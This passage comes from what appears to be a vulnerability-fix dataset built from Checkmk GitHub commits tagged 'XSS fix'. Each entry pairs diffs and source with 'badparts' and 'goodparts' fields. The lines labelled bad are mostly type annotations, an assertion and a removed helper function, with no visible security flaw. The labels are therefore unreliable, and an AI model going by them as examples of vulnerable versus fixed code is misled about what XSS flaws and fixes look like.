-> type[WatoMode] | None:\n        return ModeEditGlobals\n\n    def title(self) -> str:\n        return _(\"Edit global setting\")\n\n    def _affected_sites(self):\n        return None  # All sites\n\n    def _back_url(self) -> str:\n        return ModeEditGlobals.mode_url()\n\n\ndef is_a_checkbox(vs: ValueSpec) -> bool:\n    \"\"\"Checks if a valuespec is a Checkbox\"\"\"\n    if isinstance(vs, Checkbox):\n        return True\n    if isinstance(vs, Transform):\n        return is_a_checkbox(vs._valuespec)\n    return False\n\n\nclass MatchItemGeneratorSettings(ABCMatchItemGenerator):\n    def __init__(\n        self,\n        name: str,\n        topic: str,\n        # we cannot pass an instance here because we would get\n        # RuntimeError(\"Working outside of request context.\")\n        # when registering below due to\n        # ABCGlobalSettingsMode.__init__ --> _from_vars --> get_search_expression)\n        mode_class: type[ABCGlobalSettingsMode],\n    ) -> None:\n        super().__init__(name)\n        self._topic: Final[str] = topic\n        self._mode_class: Final[type[ABCGlobalSettingsMode]] = mode_class\n\n    def _config_variable_to_match_item(\n        self,\n        config_variable: ConfigVariable,\n        edit_mode_name: str,\n    ) -> MatchItem:\n        title = config_variable.valuespec().title() or _(\"Untitled setting\")\n        ident = config_variable.ident()\n        return MatchItem(\n            title=title,\n            topic=self._topic,\n            url=makeuri_contextless(\n                request,\n                [(\"mode\", edit_mode_name), (\"varname\", ident)],\n                filename=\"wato.py\",\n            ),\n            match_texts=[title, ident],\n        )\n\n    def generate_match_items(self) -> MatchItems:\n        mode = self._mode_class()\n        yield from (\n            self._config_variable_to_match_item(config_variable, mode.edit_mode_name)\n            for _group, config_variables in mode.iter_all_configuration_variables()\n            for config_variable in config_variables\n        )\n\n    @staticmethod\n    def is_affected_by_change(_change_action_name: str) -> bool:\n        return False\n\n    @property\n    def is_localization_dependent(self) -> bool:\n        return True\n\n\nmatch_item_generator_registry.register(\n    MatchItemGeneratorSettings(\n        \"global_settings\",\n        _(\"Global settings\"),\n        ModeEditGlobals,\n    )\n)\n"
                },
                "/cmk/gui/wato/pages/predefined_conditions.py": {
                    "changes": [
                        {
                            "diff": "\n \n import cmk.gui.userdb as userdb\n from cmk.gui.exceptions import MKUserError\n-from cmk.gui.groups import GroupSpec\n from cmk.gui.htmllib.html import html\n from cmk.gui.http import request\n from cmk.gui.i18n import _\n",
                            "add": 0,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "from cmk.gui.groups import GroupSpec"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n         return [ConfigDomainCore]\n \n \n-class ModePredefinedConditions(SimpleListMode[GroupSpec]):\n+class ModePredefinedConditions(SimpleListMode):\n     @classmethod\n     def name(cls) -> str:\n         return \"predefined_conditions\"\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "class ModePredefinedConditions(SimpleListMode[GroupSpec]):"
                            ],
                            "goodparts": [
                                "class ModePredefinedConditions(SimpleListMode):"
                            ]
                        },
                        {
                            "diff": "\n         )\n         super().page()\n \n-    def _show_action_cell(self, nr: int, table: Table, ident: str, entry: GroupSpec) -> None:\n+    def _show_action_cell(  # type: ignore[no-untyped-def]\n+        self,\n+        nr: int,\n+        table: Table,\n+        ident: str,\n+        entry,\n+    ) -> None:\n         super()._show_action_cell(nr, table, ident, entry)\n \n         html.icon_button(\n",
                            "add": 7,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "    def _show_action_cell(self, nr: int, table: Table, ident: str, entry: GroupSpec) -> None:"
                            ],
                            "goodparts": [
                                "    def _show_action_cell(  # type: ignore[no-untyped-def]",
                                "        self,",
                                "        nr: int,",
                                "        table: Table,",
                                "        ident: str,",
                                "        entry,",
                                "    ) -> None:"
                            ]
                        },
                        {
                            "diff": "\n             \"search\",\n         )\n \n-    def _search_url(self, ident: str) -> str:\n+    def _search_url(self, ident):\n         return makeuri_contextless(\n             request,\n             [\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "    def _search_url(self, ident: str) -> str:"
                            ],
                            "goodparts": [
                                "    def _search_url(self, ident):"
                            ]
                        },
                        {
                            "diff": "\n             ],\n         )\n \n-    def _show_entry_cells(self, table: Table, ident: str, entry: GroupSpec) -> None:\n+    def _show_entry_cells(self, table, ident, entry):\n         table.cell(_(\"Title\"), entry[\"title\"])\n \n         table.cell(_(\"Conditions\"))\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "    def _show_entry_cells(self, table: Table, ident: str, entry: GroupSpec) -> None:"
                            ],
                            "goodparts": [
                                "    def _show_entry_cells(self, table, ident, entry):"
                            ]
                        },
                        {
                            "diff": "\n         else:\n             html.write_text(\", \".join([self._contact_group_alias(g) for g in entry[\"shared_with\"]]))\n \n-    def _contact_group_alias(self, name: str) -> str:\n+    def _contact_group_alias(self, name):\n         return self._contact_groups.get(name, {\"alias\": name})[\"alias\"]\n \n \n-class ModeEditPredefinedCondition(SimpleEditMode[GroupSpec]):\n+class ModeEditPredefinedCondition(SimpleEditMode):\n     @classmethod\n     def name(cls) -> str:\n         return \"edit_predefined_condition\"\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "    def _contact_group_alias(self, name: str) -> str:",
                                "class ModeEditPredefinedCondition(SimpleEditMode[GroupSpec]):"
                            ],
                            "goodparts": [
                                "    def _contact_group_alias(self, name):",
                                "class ModeEditPredefinedCondition(SimpleEditMode):"
                            ]
                        },
                        {
                            "diff": "\n             ),\n         ]\n \n-    def _save(self, entries: dict[str, GroupSpec]) -> None:\n+    def _save(self, entries):\n         # In case it already existed before, remember the previous path\n         old_entries = self._store.load_for_reading()\n         old_path = None\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "    def _save(self, entries: dict[str, GroupSpec]) -> None:"
                            ],
                            "goodparts": [
                                "    def _save(self, entries):"
                            ]
                        },
                        {
                            "diff": "\n \n         super()._save(entries)\n \n-        assert self._ident is not None\n         conditions = RuleConditions.from_config(\"\", entries[self._ident][\"conditions\"])\n \n         # Update rules of source folder in case the folder was changed\n",
                            "add": 0,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "        assert self._ident is not None"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n \n         self._rewrite_rules_for(conditions)\n \n-    def _move_rules_for_conditions(self, conditions: RuleConditions, old_path: str) -> None:\n+    def _move_rules_for_conditions(self, conditions, old_path):\n+        # type (RuleConditions, str) -> None\n         \"\"\"Apply changed folder of predefined condition to rules\"\"\"\n         tree = folder_tree()\n         old_folder = tree.folder(old_path)\n",
                            "add": 2,
                            "remove": 1,
                            "filename": "/cmk/gui/wato/pages/predefined_conditions.py",
                            "badparts": [
                                "    def _move_rules_for_conditions(self, conditions: RuleConditions, old_path: str) -> None:"
                            ],
                            "goodparts": [
                                "    def _move_rules_for_conditions(self, conditions, old_path):"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"Predefine conditions that can be used in the Setup rule editor\"\"\" from collections.abc import Collection import cmk.gui.userdb as userdb from cmk.gui.exceptions import MKUserError from cmk.gui.groups import GroupSpec from cmk.gui.htmllib.html import html from cmk.gui.http import request from cmk.gui.i18n import _ from cmk.gui.logged_in import user from cmk.gui.table import Table from cmk.gui.type_defs import PermissionName from cmk.gui.utils.urls import makeuri_contextless from cmk.gui.valuespec import( Alternative, DropdownChoice, DualListChoice, FixedValue, Transform, ValueSpec, ) from cmk.gui.wato.pages.rulesets import VSExplicitConditions from cmk.gui.watolib.config_domains import ConfigDomainCore from cmk.gui.watolib.groups_io import load_contact_group_information from cmk.gui.watolib.hosts_and_folders import folder_tree from cmk.gui.watolib.mode import ModeRegistry, WatoMode from cmk.gui.watolib.predefined_conditions import PredefinedConditionStore from cmk.gui.watolib.rulesets import AllRulesets, FolderRulesets, RuleConditions, UseHostFolder from cmk.gui.watolib.rulespecs import RulespecGroup, ServiceRulespec from._simple_modes import SimpleEditMode, SimpleListMode, SimpleModeType def register(mode_registry: ModeRegistry) -> None: mode_registry.register(ModePredefinedConditions) mode_registry.register(ModeEditPredefinedCondition) class DummyRulespecGroup(RulespecGroup): @property def name(self) -> str: return \"dummy\" @property def title(self) -> str: return \"Dummy\" @property def help(self): return \"Dummy\" def dummy_rulespec() -> ServiceRulespec: return ServiceRulespec( name=\"dummy\", group=DummyRulespecGroup, valuespec=lambda: FixedValue(value=None), item_type=\"service\", ) def vs_conditions() -> Transform: return Transform( valuespec=VSExplicitConditions(rulespec=dummy_rulespec(), render=\"form_part\"), to_valuespec=lambda c: RuleConditions.from_config(\"\", c), from_valuespec=lambda c: c.to_config(UseHostFolder.HOST_FOLDER_FOR_UI), ) class PredefinedConditionModeType(SimpleModeType): def type_name(self): return \"predefined_condition\" def name_singular(self): return _(\"predefined condition\") def is_site_specific(self) -> bool: return False def can_be_disabled(self): return False def affected_config_domains(self): return[ConfigDomainCore] class ModePredefinedConditions(SimpleListMode[GroupSpec]): @classmethod def name(cls) -> str: return \"predefined_conditions\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[\"rulesets\"] def __init__(self) -> None: super().__init__( mode_type=PredefinedConditionModeType(), store=PredefinedConditionStore(), ) self._contact_groups=load_contact_group_information() def title(self) -> str: return _(\"Predefined conditions\") def _table_title(self): return _(\"Predefined conditions\") def _validate_deletion(self, ident, entry): if{ name: ruleset for name, ruleset in AllRulesets.load_all_rulesets().get_rulesets().items() if ruleset.matches_search_with_rules({\"rule_predefined_condition\": ident}) }: raise MKUserError( \"_delete\", _('You can not delete this %s because it is <a href=\"%s\">in use</a>.') %(self._mode_type.name_singular(), self._search_url(ident)), ) def page(self) -> None: html.p( _( \"This module can be used to define conditions for Checkmk rules in a central place. \" \"You can then refer to these conditions from different rulesets. Using these predefined \" \"conditions may save you a lot of redundant conditions when you need them in multiple \" \"rulesets.\" ) ) super().page() def _show_action_cell(self, nr: int, table: Table, ident: str, entry: GroupSpec) -> None: super()._show_action_cell(nr, table, ident, entry) html.icon_button( self._search_url(ident), _(\"Show rules using this %s\") % self._mode_type.name_singular(), \"search\", ) def _search_url(self, ident: str) -> str: return makeuri_contextless( request, [ (\"mode\", \"rule_search\"), (\"filled_in\", \"rule_search\"), (\"search_p_rule_predefined_condition\", DropdownChoice.option_id(ident)), (\"search_p_rule_predefined_condition_USE\", \"on\"), ], ) def _show_entry_cells(self, table: Table, ident: str, entry: GroupSpec) -> None: table.cell(_(\"Title\"), entry[\"title\"]) table.cell(_(\"Conditions\")) html.open_ul(class_=\"conditions\") html.open_li() html.write_text( \"{}:{}\".format( _(\"Folder\"), folder_tree().folder(entry[\"conditions\"][\"host_folder\"]).alias_path() ) ) html.close_li() html.close_ul() html.write_text(vs_conditions().value_to_html(entry[\"conditions\"])) table.cell(_(\"Editable by\")) if entry[\"owned_by\"] is None: html.write_text( _( \"Administrators(having the permission \" '\"Write access to all predefined conditions\")' ) ) else: html.write_text(self._contact_group_alias(entry[\"owned_by\"])) table.cell(_(\"Shared with\")) if not entry[\"shared_with\"]: html.write_text(_(\"Not shared\")) else: html.write_text(\", \".join([self._contact_group_alias(g) for g in entry[\"shared_with\"]])) def _contact_group_alias(self, name: str) -> str: return self._contact_groups.get(name,{\"alias\": name})[\"alias\"] class ModeEditPredefinedCondition(SimpleEditMode[GroupSpec]): @classmethod def name(cls) -> str: return \"edit_predefined_condition\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[\"rulesets\"] @classmethod def parent_mode(cls) -> type[WatoMode] | None: return ModePredefinedConditions def __init__(self) -> None: super().__init__( mode_type=PredefinedConditionModeType(), store=PredefinedConditionStore(), ) def _vs_individual_elements(self): if user.may(\"wato.edit_all_predefined_conditions\"): admin_element: list[ValueSpec]=[ FixedValue( value=None, title=_(\"Administrators\"), totext=_( \"Administrators(having the permission \" '\"Write access to all predefined conditions\")' ), ) ] else: admin_element=[] return[ (\"conditions\", vs_conditions()), ( \"owned_by\", Alternative( title=_(\"Editable by\"), help=_( \"Each predefined condition is owned by a group of users which are able to edit, \" \"delete and use existing predefined conditions.\" ), elements=admin_element +[ DropdownChoice( title=_(\"Members of the contact group:\"), choices=lambda: self._contact_group_choices(only_own=True), invalid_choice=\"complain\", empty_text=_( \"You need to be member of at least one contact group to be able to \" \"create a predefined condition.\" ), invalid_choice_title=_(\"Group not existant or not member\"), invalid_choice_error=_( \"The choosen group is either not existant \" \"anymore or you are not a member of this \" \"group. Please choose another one.\" ), ), ], ), ), ( \"shared_with\", DualListChoice( title=_(\"Share with\"), help=_( \"By default only the members of the owner contact group are permitted \" \"to use a a predefined condition. It is possible to share it with \" \"other groups of users to make them able to use a predefined condition in rules.\" ), choices=self._contact_group_choices, autoheight=False, ), ), ] def _save(self, entries: dict[str, GroupSpec]) -> None: old_entries=self._store.load_for_reading() old_path=None if self._ident in old_entries: old_path=self._store.load_for_reading()[self._ident][\"conditions\"][\"host_folder\"] super()._save(entries) assert self._ident is not None conditions=RuleConditions.from_config(\"\", entries[self._ident][\"conditions\"]) if old_path is not None and old_path !=conditions.host_folder: self._move_rules_for_conditions(conditions, old_path) self._rewrite_rules_for(conditions) def _move_rules_for_conditions(self, conditions: RuleConditions, old_path: str) -> None: \"\"\"Apply changed folder of predefined condition to rules\"\"\" tree=folder_tree() old_folder=tree.folder(old_path) old_rulesets=FolderRulesets.load_folder_rulesets(old_folder) new_folder=tree.folder(conditions.host_folder) new_rulesets=FolderRulesets.load_folder_rulesets(new_folder) for old_ruleset in old_rulesets.get_rulesets().values(): for rule in old_ruleset.get_folder_rules(old_folder): if rule.predefined_condition_id()==self._ident: old_ruleset.delete_rule(rule) new_ruleset=new_rulesets.get(old_ruleset.name) new_ruleset.append_rule(new_folder, rule) new_rulesets.save_folder() old_rulesets.save_folder() def _rewrite_rules_for(self, conditions: RuleConditions) -> None: \"\"\"Apply changed predefined condition to rules After updating a predefined condition it is necessary to rewrite the rules.mk the predefined condition refers to. Rules in this file may refer to the changed predefined condition. Since the conditions are only applied to the rules while saving them this step is needed. \"\"\" folder=folder_tree().folder(conditions.host_folder) rulesets=FolderRulesets.load_folder_rulesets(folder) for ruleset in rulesets.get_rulesets().values(): for rule in ruleset.get_folder_rules(folder): if rule.predefined_condition_id()==self._ident: rule.update_conditions(conditions) rulesets.save_folder() def _contact_group_choices(self, only_own=False): contact_groups=load_contact_group_information() if only_own: assert user.id is not None user_groups=userdb.contactgroups_of_user(user.id) else: user_groups=[] entries=[ (c, g[\"alias\"]) for c, g in contact_groups.items() if not only_own or c in user_groups ] return sorted(entries, key=lambda x: x[1]) ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2019 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\"\"\"Predefine conditions that can be used in the Setup rule editor\"\"\"\n\nfrom collections.abc import Collection\n\nimport cmk.gui.userdb as userdb\nfrom cmk.gui.exceptions import MKUserError\nfrom cmk.gui.groups import GroupSpec\nfrom cmk.gui.htmllib.html import html\nfrom cmk.gui.http import request\nfrom cmk.gui.i18n import _\nfrom cmk.gui.logged_in import user\nfrom cmk.gui.table import Table\nfrom cmk.gui.type_defs import PermissionName\nfrom cmk.gui.utils.urls import makeuri_contextless\nfrom cmk.gui.valuespec import (\n    Alternative,\n    DropdownChoice,\n    DualListChoice,\n    FixedValue,\n    Transform,\n    ValueSpec,\n)\nfrom cmk.gui.wato.pages.rulesets import VSExplicitConditions\nfrom cmk.gui.watolib.config_domains import ConfigDomainCore\nfrom cmk.gui.watolib.groups_io import load_contact_group_information\nfrom cmk.gui.watolib.hosts_and_folders import folder_tree\nfrom cmk.gui.watolib.mode import ModeRegistry, WatoMode\nfrom cmk.gui.watolib.predefined_conditions import PredefinedConditionStore\nfrom cmk.gui.watolib.rulesets import AllRulesets, FolderRulesets, RuleConditions, UseHostFolder\nfrom cmk.gui.watolib.rulespecs import RulespecGroup, ServiceRulespec\n\nfrom ._simple_modes import SimpleEditMode, SimpleListMode, SimpleModeType\n\n\ndef register(mode_registry: ModeRegistry) -> None:\n    mode_registry.register(ModePredefinedConditions)\n    mode_registry.register(ModeEditPredefinedCondition)\n\n\nclass DummyRulespecGroup(RulespecGroup):\n    @property\n    def name(self) -> str:\n        return \"dummy\"\n\n    @property\n    def title(self) -> str:\n        return \"Dummy\"\n\n    @property\n    def help(self):\n        return \"Dummy\"\n\n\ndef dummy_rulespec() -> ServiceRulespec:\n    return ServiceRulespec(\n        name=\"dummy\",\n        group=DummyRulespecGroup,\n        valuespec=lambda: FixedValue(value=None),\n        item_type=\"service\",\n    )\n\n\ndef vs_conditions() -> Transform:\n    return Transform(\n        valuespec=VSExplicitConditions(rulespec=dummy_rulespec(), render=\"form_part\"),\n        to_valuespec=lambda c: RuleConditions.from_config(\"\", c),\n        from_valuespec=lambda c: c.to_config(UseHostFolder.HOST_FOLDER_FOR_UI),\n    )\n\n\nclass PredefinedConditionModeType(SimpleModeType):\n    def type_name(self):\n        return \"predefined_condition\"\n\n    def name_singular(self):\n        return _(\"predefined condition\")\n\n    def is_site_specific(self) -> bool:\n        return False\n\n    def can_be_disabled(self):\n        return False\n\n    def affected_config_domains(self):\n        return [ConfigDomainCore]\n\n\nclass ModePredefinedConditions(SimpleListMode[GroupSpec]):\n    @classmethod\n    def name(cls) -> str:\n        return \"predefined_conditions\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return [\"rulesets\"]\n\n    def __init__(self) -> None:\n        super().__init__(\n            mode_type=PredefinedConditionModeType(),\n            store=PredefinedConditionStore(),\n        )\n        self._contact_groups = load_contact_group_information()\n\n    def title(self) -> str:\n        return _(\"Predefined conditions\")\n\n    def _table_title(self):\n        return _(\"Predefined conditions\")\n\n    def _validate_deletion(self, ident, entry):\n        if {\n            name: ruleset\n            for name, ruleset in AllRulesets.load_all_rulesets().get_rulesets().items()\n            if ruleset.matches_search_with_rules({\"rule_predefined_condition\": ident})\n        }:\n            raise MKUserError(\n                \"_delete\",\n                _('You can not delete this %s because it is <a href=\"%s\">in use</a>.')\n                % (self._mode_type.name_singular(), self._search_url(ident)),\n            )\n\n    def page(self) -> None:\n        html.p(\n            _(\n                \"This module can be used to define conditions for Checkmk rules in a central place. \"\n                \"You can then refer to these conditions from different rulesets. Using these predefined \"\n                \"conditions may save you a lot of redundant conditions when you need them in multiple \"\n                \"rulesets.\"\n            )\n        )\n        super().page()\n\n    def _show_action_cell(self, nr: int, table: Table, ident: str, entry: GroupSpec) -> None:\n        super()._show_action_cell(nr, table, ident, entry)\n\n        html.icon_button(\n            self._search_url(ident),\n            _(\"Show rules using this %s\") % self._mode_type.name_singular(),\n            \"search\",\n        )\n\n    def _search_url(self, ident: str) -> str:\n        return makeuri_contextless(\n            request,\n            [\n                (\"mode\", \"rule_search\"),\n                (\"filled_in\", \"rule_search\"),\n                (\"search_p_rule_predefined_condition\", DropdownChoice.option_id(ident)),\n                (\"search_p_rule_predefined_condition_USE\", \"on\"),\n            ],\n        )\n\n    def _show_entry_cells(self, table: Table, ident: str, entry: GroupSpec) -> None:\n        table.cell(_(\"Title\"), entry[\"title\"])\n\n        table.cell(_(\"Conditions\"))\n        html.open_ul(class_=\"conditions\")\n        html.open_li()\n        html.write_text(\n            \"{}: {}\".format(\n                _(\"Folder\"), folder_tree().folder(entry[\"conditions\"][\"host_folder\"]).alias_path()\n            )\n        )\n        html.close_li()\n        html.close_ul()\n        html.write_text(vs_conditions().value_to_html(entry[\"conditions\"]))\n\n        table.cell(_(\"Editable by\"))\n        if entry[\"owned_by\"] is None:\n            html.write_text(\n                _(\n                    \"Administrators (having the permission \"\n                    '\"Write access to all predefined conditions\")'\n                )\n            )\n        else:\n            html.write_text(self._contact_group_alias(entry[\"owned_by\"]))\n\n        table.cell(_(\"Shared with\"))\n        if not entry[\"shared_with\"]:\n            html.write_text(_(\"Not shared\"))\n        else:\n            html.write_text(\", \".join([self._contact_group_alias(g) for g in entry[\"shared_with\"]]))\n\n    def _contact_group_alias(self, name: str) -> str:\n        return self._contact_groups.get(name, {\"alias\": name})[\"alias\"]\n\n\nclass ModeEditPredefinedCondition(SimpleEditMode[GroupSpec]):\n    @classmethod\n    def name(cls) -> str:\n        return \"edit_predefined_condition\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return [\"rulesets\"]\n\n    @classmethod\n    def parent_mode(cls) -> type[WatoMode] | None:\n        return ModePredefinedConditions\n\n    def __init__(self) -> None:\n        super().__init__(\n            mode_type=PredefinedConditionModeType(),\n            store=PredefinedConditionStore(),\n        )\n\n    def _vs_individual_elements(self):\n        if user.may(\"wato.edit_all_predefined_conditions\"):\n            admin_element: list[ValueSpec] = [\n                FixedValue(\n                    value=None,\n                    title=_(\"Administrators\"),\n                    totext=_(\n                        \"Administrators (having the permission \"\n                        '\"Write access to all predefined conditions\")'\n                    ),\n                )\n            ]\n        else:\n            admin_element = []\n\n        return [\n            (\"conditions\", vs_conditions()),\n            (\n                \"owned_by\",\n                Alternative(\n                    title=_(\"Editable by\"),\n                    help=_(\n                        \"Each predefined condition is owned by a group of users which are able to edit, \"\n                        \"delete and use existing predefined conditions.\"\n                    ),\n                    elements=admin_element\n                    + [\n                        DropdownChoice(\n                            title=_(\"Members of the contact group:\"),\n                            choices=lambda: self._contact_group_choices(only_own=True),\n                            invalid_choice=\"complain\",\n                            empty_text=_(\n                                \"You need to be member of at least one contact group to be able to \"\n                                \"create a predefined condition.\"\n                            ),\n                            invalid_choice_title=_(\"Group not existant or not member\"),\n                            invalid_choice_error=_(\n                                \"The choosen group is either not existant \"\n                                \"anymore or you are not a member of this \"\n                                \"group. Please choose another one.\"\n                            ),\n                        ),\n                    ],\n                ),\n            ),\n            (\n                \"shared_with\",\n                DualListChoice(\n                    title=_(\"Share with\"),\n                    help=_(\n                        \"By default only the members of the owner contact group are permitted \"\n                        \"to use a a predefined condition. It is possible to share it with \"\n                        \"other groups of users to make them able to use a predefined condition in rules.\"\n                    ),\n                    choices=self._contact_group_choices,\n                    autoheight=False,\n                ),\n            ),\n        ]\n\n    def _save(self, entries: dict[str, GroupSpec]) -> None:\n        # In case it already existed before, remember the previous path\n        old_entries = self._store.load_for_reading()\n        old_path = None\n        if self._ident in old_entries:\n            old_path = self._store.load_for_reading()[self._ident][\"conditions\"][\"host_folder\"]\n\n        super()._save(entries)\n\n        assert self._ident is not None\n        conditions = RuleConditions.from_config(\"\", entries[self._ident][\"conditions\"])\n\n        # Update rules of source folder in case the folder was changed\n        if old_path is not None and old_path != conditions.host_folder:\n            self._move_rules_for_conditions(conditions, old_path)\n\n        self._rewrite_rules_for(conditions)\n\n    def _move_rules_for_conditions(self, conditions: RuleConditions, old_path: str) -> None:\n        \"\"\"Apply changed folder of predefined condition to rules\"\"\"\n        tree = folder_tree()\n        old_folder = tree.folder(old_path)\n        old_rulesets = FolderRulesets.load_folder_rulesets(old_folder)\n\n        new_folder = tree.folder(conditions.host_folder)\n        new_rulesets = FolderRulesets.load_folder_rulesets(new_folder)\n\n        for old_ruleset in old_rulesets.get_rulesets().values():\n            for rule in old_ruleset.get_folder_rules(old_folder):\n                if rule.predefined_condition_id() == self._ident:\n                    old_ruleset.delete_rule(rule)\n\n                    new_ruleset = new_rulesets.get(old_ruleset.name)\n                    new_ruleset.append_rule(new_folder, rule)\n\n        new_rulesets.save_folder()\n        old_rulesets.save_folder()\n\n    def _rewrite_rules_for(self, conditions: RuleConditions) -> None:\n        \"\"\"Apply changed predefined condition to rules\n\n        After updating a predefined condition it is necessary to rewrite the\n        rules.mk the predefined condition refers to. Rules in this file may refer to\n        the changed predefined condition. Since the conditions are only applied to the\n        rules while saving them this step is needed.\n        \"\"\"\n        folder = folder_tree().folder(conditions.host_folder)\n        rulesets = FolderRulesets.load_folder_rulesets(folder)\n\n        for ruleset in rulesets.get_rulesets().values():\n            for rule in ruleset.get_folder_rules(folder):\n                if rule.predefined_condition_id() == self._ident:\n                    rule.update_conditions(conditions)\n\n        rulesets.save_folder()\n\n    def _contact_group_choices(self, only_own=False):\n        contact_groups = load_contact_group_information()\n\n        if only_own:\n            assert user.id is not None\n            user_groups = userdb.contactgroups_of_user(user.id)\n        else:\n            user_groups = []\n\n        entries = [\n            (c, g[\"alias\"]) for c, g in contact_groups.items() if not only_own or c in user_groups\n        ]\n        return sorted(entries, key=lambda x: x[1])\n"
                }
            },
            "msg": "Revert \"Cleanup no-untyped-def in wato #12\"\n\nThis reverts commit 2e109af9b2a7bdefbba6f7fa655a8ba3483e6c8d.\n\nXSS crawler revealed an issue on the DCD and InfluxDB create pages."
        },
        "89b9017313905132192c5e8f72506b5650e85cb8": {
            "url": "https://api.github.com/repos/Checkmk/checkmk/commits/89b9017313905132192c5e8f72506b5650e85cb8",
            "html_url": "https://github.com/Checkmk/checkmk/commit/89b9017313905132192c5e8f72506b5650e85cb8",
            "sha": "89b9017313905132192c5e8f72506b5650e85cb8",
            "keyword": "XSS fix",
            "diff": "diff --git a/cmk/gui/quick_setup/_modes.py b/cmk/gui/quick_setup/_modes.py\nindex fb58b3bc6d2..57862783b40 100644\n--- a/cmk/gui/quick_setup/_modes.py\n+++ b/cmk/gui/quick_setup/_modes.py\n@@ -49,7 +49,6 @@\n     ConfigBundleStore,\n     delete_config_bundle,\n     edit_config_bundle_configuration,\n-    identify_bundle_group_type,\n     identify_bundle_references,\n     load_group_bundles,\n     valid_special_agent_bundle,\n@@ -152,7 +151,7 @@ def ensure_permissions(self) -> None:\n \n     def _from_vars(self) -> None:\n         self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n-        self._bundle_group_type = identify_bundle_group_type(self._name)\n+        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n         if self._bundle_group_type not in BUNDLE_DOMAINS:\n             raise MKUserError(\n                 None,\ndiff --git a/cmk/gui/watolib/configuration_bundles.py b/cmk/gui/watolib/configuration_bundles.py\nindex 989352d1009..cd49043447f 100644\n--- a/cmk/gui/watolib/configuration_bundles.py\n+++ b/cmk/gui/watolib/configuration_bundles.py\n@@ -121,12 +121,6 @@ class BundleReferences:\n     dcd_connections: Sequence[tuple[str, DCDConnectionSpec]] | None = None\n \n \n-def identify_bundle_group_type(bundle_group: str) -> RuleGroupType:\n-    if bundle_group.startswith(RuleGroupType.SPECIAL_AGENTS.value):\n-        return RuleGroupType.SPECIAL_AGENTS\n-    raise ValueError(f\"Unknown bundle group: {bundle_group}\")\n-\n-\n def valid_special_agent_bundle(bundle: BundleReferences) -> bool:\n     host_conditions = bundle.hosts is not None and len(bundle.hosts) == 1\n     rule_conditions = bundle.rules is not None and len(bundle.rules) == 1\n",
            "message": "",
            "files": {
                "/cmk/gui/quick_setup/_modes.py": {
                    "changes": [
                        {
                            "diff": "\n     ConfigBundleStore,\n     delete_config_bundle,\n     edit_config_bundle_configuration,\n-    identify_bundle_group_type,\n     identify_bundle_references,\n     load_group_bundles,\n     valid_special_agent_bundle,\n",
                            "add": 0,
                            "remove": 1,
                            "filename": "/cmk/gui/quick_setup/_modes.py",
                            "badparts": [
                                "    identify_bundle_group_type,"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n \n     def _from_vars(self) -> None:\n         self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n-        self._bundle_group_type = identify_bundle_group_type(self._name)\n+        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])\n         if self._bundle_group_type not in BUNDLE_DOMAINS:\n             raise MKUserError(\n                 None,",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/quick_setup/_modes.py",
                            "badparts": [
                                "        self._bundle_group_type = identify_bundle_group_type(self._name)"
                            ],
                            "goodparts": [
                                "        self._bundle_group_type = RuleGroupType(self._name.split(\":\")[0])"
                            ]
                        }
                    ],
                    "source": "\n from collections.abc import Callable, Collection, Iterator, Mapping, Sequence from typing import Protocol from cmk.ccc.exceptions import MKGeneralException from cmk.utils.rulesets.definition import RuleGroup, RuleGroupType from cmk.gui import forms from cmk.gui.breadcrumb import Breadcrumb from cmk.gui.config import active_config from cmk.gui.exceptions import MKUserError from cmk.gui.htmllib.generator import HTMLWriter from cmk.gui.htmllib.html import html from cmk.gui.http import request from cmk.gui.i18n import _ from cmk.gui.logged_in import user from cmk.gui.page_menu import( make_form_bulk_submit_link, make_simple_form_page_menu, make_simple_link, PageMenu, PageMenuDropdown, PageMenuEntry, PageMenuTopic, ) from cmk.gui.quick_setup.v0_unstable._registry import quick_setup_registry from cmk.gui.table import Foldable, Table, table_element from cmk.gui.type_defs import ActionResult, HTTPVariables, Icon, PermissionName from cmk.gui.utils.csrf_token import check_csrf_token from cmk.gui.utils.escaping import escape_to_html_permissive from cmk.gui.utils.html import HTML from cmk.gui.utils.transaction_manager import transactions from cmk.gui.utils.urls import make_confirm_delete_link from cmk.gui.valuespec import Dictionary, DictionaryEntry, FixedValue, RuleComment, TextInput from cmk.gui.wato._main_module_topics import MainModuleTopicQuickSetup from cmk.gui.wato.pages.hosts import ModeEditHost from cmk.gui.wato.pages.password_store import ModeEditPassword from cmk.gui.wato.pages.rulesets import ModeEditRule from cmk.gui.watolib.configuration_bundles import( BUNDLE_DOMAINS, BundleId, BundleReferences, ConfigBundle, ConfigBundleStore, delete_config_bundle, edit_config_bundle_configuration, identify_bundle_group_type, identify_bundle_references, 